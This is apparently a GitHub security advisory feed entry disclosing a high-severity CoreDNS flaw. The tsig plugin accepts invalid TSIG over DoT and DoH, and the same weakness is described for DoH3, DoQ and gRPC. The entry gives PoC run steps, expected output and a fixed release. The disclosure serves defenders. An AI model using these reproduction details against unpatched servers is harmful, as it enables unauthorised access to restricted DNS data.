-<p>CoreDNS' tsig plugin can be bypassed on non-plain-DNS transports because it trusts the transport writer's TsigStatus() instead of performing verification itself. In the attached PoC, plain DNS/TCP correctly rejects an invalid TSIG (NOTAUTH), while the same invalid-TSIG request is accepted over DoT (tls://) and DoH (https://), allowing a client without the shared secret to satisfy require all. The same bug class affects DoH3, DoQ, and gRPC.</p>
-<h3 id="details">Details</h3>
-<p>The tsig plugin decides whether an incoming TSIG was valid by consulting w.TsigStatus(): tsigStatus := w.TsigStatus(); if tsigStatus != nil { ... NOTAUTH ... } (plugin/tsig/tsig.go)</p>
-<p>Two affected transports are shown directly in the PoC:</p>
-<ul>
-<li>DoH: DoHWriter.TsigStatus() always returns nil (core/dnsserver/https.go), and the HTTP server passes unpacked DNS messages directly into the plugin chain.</li>
-<li>DoT: the TLS server builds a dns.Server without setting TsigSecret (core/dnsserver/server_tls.go), unlike plain DNS/TCP/UDP which sets TsigSecret: s.tsigSecret (core/dnsserver/server.go).</li>
-</ul>
-<p>The same transport-family bug pattern also appears on other transports:</p>
-<ul>
-<li>DoH3 reuses the DoH writer path (core/dnsserver/server_https3.go -&gt; core/dnsserver/https.go), so it inherits the same TsigStatus() == nil behavior.</li>
-<li>DoQ uses DoQWriter.TsigStatus() error { return nil } (core/dnsserver/quic.go).</li>
-<li>gRPC uses gRPCresponse.TsigStatus() error { return nil } (core/dnsserver/server_grpc.go).</li>
-</ul>
-<p>The attached PoC was kept deliberately small (baseline TCP+DoT+DoH only) for convenience.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Adjust COREDNS_BIN in the PoC to point at right path (see the top-level const definitions for tunables as well)</li>
-<li>Run python3 ./tsig-repro.py</li>
-<li>Expected output:
-*** Start CoreDNS ***
-Corefile: /tmp/vh-f001-tsig-doh-dot-bypass/Corefile
-Log: /tmp/vh-f001-tsig-doh-dot-bypass/coredns.log</li>
-</ol>
-<p>*** Baseline (plain TCP) ***
-no_tsig rcode=5 (expected REFUSED=5)
-invalid_tsig rcode=9 (expected NOTAUTH=9)</p>
-<p>*** Candidate (DoT) ***
-no_tsig rcode=5 (expected REFUSED=5)
-invalid_tsig rcode=0 ancount=1 (expected NOERROR=0 and ancount&gt;0)</p>
-<p>*** Candidate (DoH) ***
-no_tsig http=200 rcode=5 (expected REFUSED=5)
-invalid_tsig http=200 rcode=0 ancount=1 (expected NOERROR=0 and ancount&gt;0)</p>
-<p>*** OK ***
-TSIG bypass reproduced: plain TCP rejects invalid TSIG, while DoT and DoH accept it.
-Results: /tmp/vh-f001-tsig-doh-dot-bypass/results.json</p>
-<h3 id="impact">Impact</h3>
-<p>Unauthenticated remote clients can bypass TSIG-based authentication/authorization on first-class encrypted transports, enabling access to whatever the deployment intended to restrict behind tsig { require all } (e.g., zone data/privileged queries, etc.).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/coredns/coredns/security/advisories/GHSA-qhmp-q7xh-99rh">https://github.com/coredns/coredns/security/advisories/GHSA-qhmp-q7xh-99rh</a></li>
-<li><a href="https://github.com/coredns/coredns/releases/tag/v1.14.3">https://github.com/coredns/coredns/releases/tag/v1.14.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-qhmp-q7xh-99rh">https://github.com/advisories/GHSA-qhmp-q7xh-99rh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qhmp-q7xh-99rh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-28T22:46:15.000Z</published>
     </entry>
 </feed>
